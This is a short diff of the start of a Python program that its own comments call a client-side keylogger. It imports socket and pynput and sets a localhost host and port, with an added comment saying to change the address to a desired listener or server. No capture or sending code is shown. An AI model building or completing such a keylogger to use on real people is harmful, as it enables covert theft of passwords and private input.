@@ -1,7 +1,9 @@
 # This is our main menu for the keylogger
+#Client side Keylogger
 import socket
 from pynput import keyboard
 # implementing HOST and PORT for networking
+# This is only localHost please change this to a desired  Listener/Server
 HOST ='127.0.0.1'
 PORT =65432
 def printMenu():
